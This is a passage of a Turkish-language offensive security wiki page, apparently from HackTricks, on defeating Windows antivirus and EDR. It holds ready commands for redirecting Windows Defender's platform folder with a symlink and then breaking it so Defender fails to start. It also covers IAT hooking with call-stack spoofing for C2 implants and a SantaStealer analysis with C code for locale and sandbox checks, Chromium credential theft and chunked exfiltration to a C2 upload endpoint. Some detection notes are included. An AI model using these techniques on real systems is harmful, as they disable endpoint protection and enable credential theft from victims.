mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)'in yönlendirilen yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Yeni işlem yolunu `C:\TMP\AV\` altında ve servis yapılandırması/registry'nin bu konumu yansıttığını görmelisiniz.

Post-exploitation options
- DLL sideloading/code execution: Defender'ın uygulama dizininden yüklediği DLL'leri bırakarak/değiştirerek Defender süreçlerinde code çalıştırın. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: version-symlink'i kaldırın; böylece bir sonraki başlatmada yapılandırılmış yol çözülmez ve Defender başlamayı başaramaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Bu teknik tek başına ayrıcalık yükseltme sağlamaz; yönetici hakları gerektirir.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams, runtime evasion'ı C2 implant'tan çıkarıp hedef modülün içine taşıyabilir; bunun için Import Address Table (IAT) hooklanır ve seçili API'ler saldırgan kontrolündeki, position‑independent code (PIC) üzerinden yönlendirilir. Bu, birçok kitin (ör. CreateProcessA) açığa çıkardığı küçük API yüzeyinin ötesinde evasion'ı genelleştirir ve aynı korumaları BOF'lar ve post‑exploitation DLL'lerine genişletir.

High-level approach
- Hedef modülle birlikte, reflective loader kullanarak (prepended veya companion) bir PIC blob konumlandırın. PIC kendi içinde tam olmalı ve position‑independent olmalıdır.
- Host DLL yüklenirken, IMAGE_IMPORT_DESCRIPTOR üzerinde gezinip hedeflenen import'lar (ör., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) için IAT girdelerini ince PIC wrapper'lara işaret edecek şekilde yama yapın.
- Her PIC wrapper gerçek API adresine tail‑calling yapmadan önce evasions uygular. Tipik evasions şunlardır:
  - Çağrı etrafında bellek maskesi/maske kaldırma (ör., beacon bölgelerini şifreleme, RWX→RX, sayfa isimlerini/izinlerini değiştirme) ve çağrı sonrası geri yükleme.
  - Call‑stack spoofing: meşru bir stack oluşturup hedef API'ye geçiş yaparak call‑stack analizinin beklenen frame'lere işaret etmesini sağlamak.
- Uyumluluk için bir arayüz export edin; böylece bir Aggressor script (veya eşdeğeri) Beacon, BOF'lar ve post‑ex DLL'ler için hangi API'lerin hooklanacağını kaydedebilir.

Why IAT hooking here
- Hooklanan import'u kullanan herhangi bir kod için çalışır; araç kodunu değiştirmeye veya belirli API'lerin proxy'si için Beacon'a güvenmeye gerek yoktur.
- Post‑ex DLL'leri kapsar: LoadLibrary* hook'lamak, module yüklemelerini (ör., System.Management.Automation.dll, clr.dll) yakalamanıza ve aynı maskelenme/stack evasion'ını onların API çağrılarına uygulamanıza izin verir.
- CreateProcessA/W'i sararak call‑stack–tabanlı tespitlere karşı process‑spawning post‑ex komutlarının güvenilir kullanımını geri kazandırır.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Yaması relocations/ASLR'den sonra ve import'ın ilk kullanımından önce uygula. Reflective loaders like TitanLdr/AceLdr, yüklü modülün DllMain sırasında hooking yaptıklarını gösterir.
- Wrapper'ları küçük ve PIC-safe tut; gerçek API'yi patch uygulamadan önce yakaladığın orijinal IAT değeri üzerinden veya LdrGetProcedureAddress ile çöz.
- PIC için RW → RX geçişlerini kullan ve writable+executable sayfalar bırakmaktan kaçın.

Call‑stack spoofing stub
- Draugr‑style PIC stubs sahte bir call chain (return addresses into benign modules) oluşturur ve sonra gerçek API'ye pivot eder.
- Bu, Beacon/BOFs'tan sensitive API'lere doğru canonical stack'leri bekleyen tespitleri atlatır.
- API prologue'dan önce beklenen frame'lerin içine ulaşmak için stack cutting/stack stitching teknikleriyle eşleştir.

Operasyonel entegrasyon
- Reflective loader'ı post‑ex DLL'lerin başına ekle ki PIC ve hooks, DLL yüklendiğinde otomatik olarak initialise olsun.
- Hedef API'leri kaydetmek için bir Aggressor script kullan; böylece Beacon ve BOFs kod değişikliği olmadan aynı evasion path'ten transparan şekilde faydalanır.

Tespit/DFIR hususları
- IAT integrity: non‑image (heap/anon) adreslere çözülen girdiler; import pointer'ların periyodik doğrulanması.
- Stack anomalies: yüklü image'lere ait olmayan return adresleri; non‑image PIC'e ani geçişler; tutarsız RtlUserThreadStart ata zinciri.
- Loader telemetry: işlem içi IAT yazmaları, import thunk'larını değiştiren erken DllMain aktivitesi, yüklemede oluşturulan beklenmedik RX region'ları.
- Image‑load evasion: eğer hooking LoadLibrary* varsa, memory masking event'larıyla ilişkili automation/clr assembly'lerin şüpheli yüklemelerini izle.

İlgili yapı taşları ve örnekler
- Load sırasında IAT patching yapan Reflective loaders (ör., TitanLdr, AceLdr)
- Memory masking hooks (ör., simplehook) ve stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (ör., Draugr)

## SantaStealer: Dosyasız Kaçınma ve Kimlik Bilgisi Hırsızlığı için Tradecraft

SantaStealer (aka BluelineStealer), modern info‑stealer'ların AV bypass, anti‑analysis ve credential access'i tek bir iş akışında nasıl harmanladığını gösterir.

### Klavye düzeni kontrolü & sandbox gecikmesi

- Bir config flag (`anti_cis`) `GetKeyboardLayoutList` aracılığıyla yüklü klavye düzenlerini listeler. Eğer bir Kiril düzen bulunursa, örnek boş bir `CIS` marker bırakır ve stealers çalıştırılmadan önce sonlanır; bu, hariç tutulan yerellerde asla tetiklenmemesini sağlarken bir hunting artifact bırakır.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Katmanlı `check_antivm` mantığı

- Variant A işlem listesini tarar, her adı özel bir rolling checksum ile hash'ler ve bunu debugger/sandbox'lar için gömülü blocklist'lerle karşılaştırır; aynı checksum'u bilgisayar adı üzerinde tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
- Variant B sistem özelliklerini inceler (process-count floor, recent uptime), VirtualBox eklentilerini tespit etmek için `OpenServiceA("VBoxGuest")` çağırır ve single-stepping'i ortaya çıkarmak için uyku çevresinde zamanlama kontrolleri yapar. Herhangi bir tespit modüller başlatılmadan önce işlemi sonlandırır.

### Dosyasız yardımcı + çift ChaCha20 yansıtmalı yükleme

- Birincil DLL/EXE, diske bırakılan veya belleğe manuel olarak map edilen bir Chromium credential helper'ı gömülü olarak taşır; fileless mode imports/relocations'ı kendisi çözer, böylece hiçbir helper artefaktı yazılmaz.
- O yardımcı, ChaCha20 ile iki kez şifrelenmiş ikinci aşama bir DLL saklar (iki 32-byte anahtar + 12-byte nonce). Her iki geçişten sonra blob'u reflectively load eder (hiçbir `LoadLibrary` çağrılmaz) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)'dan türetilen `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export'larını çağırır.
- ChromElevator rutinleri, canlı bir Chromium tarayıcısına enjekte etmek için direct-syscall reflective process hollowing kullanır, AppBound Encryption anahtarlarını devralır ve ABE sertleştirmesine rağmen SQLite veritabanlarından doğrudan şifreleri/cookie'leri/kredi kartlarını çözür.

### Modüler bellek içi toplama & parçalı HTTP exfil

- `create_memory_based_log` global `memory_generators` function-pointer tablosunda iterasyon yapar ve etkin her modül için (Telegram, Discord, Steam, screenshots, documents, browser extensions, vb.) bir thread başlatır. Her thread sonuçları paylaşılan buffer'lara yazar ve ~45s'lik join penceresinin ardından dosya sayısını raporlar.
- İşlem tamamlandığında, her şey statik linklenmiş `miniz` kütüphanesi ile `%TEMP%\\Log.zip` olarak ziplenir. `ThreadPayload1` sonra 15s uyur ve arşivi HTTP POST ile `http://<C2>:6767/upload` adresine 10 MB parçalar halinde stream eder, bir tarayıcı `multipart/form-data` boundary'sini (`----WebKitFormBoundary***`) taklit eder. Her parça `User-Agent: upload`, `auth: <build_id>`, isteğe bağlı `w: <campaign_tag>` ekler ve son parça `complete: true` ekleyerek C2'nin yeniden birleştirmenin bittiğini bilmesini sağlar.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
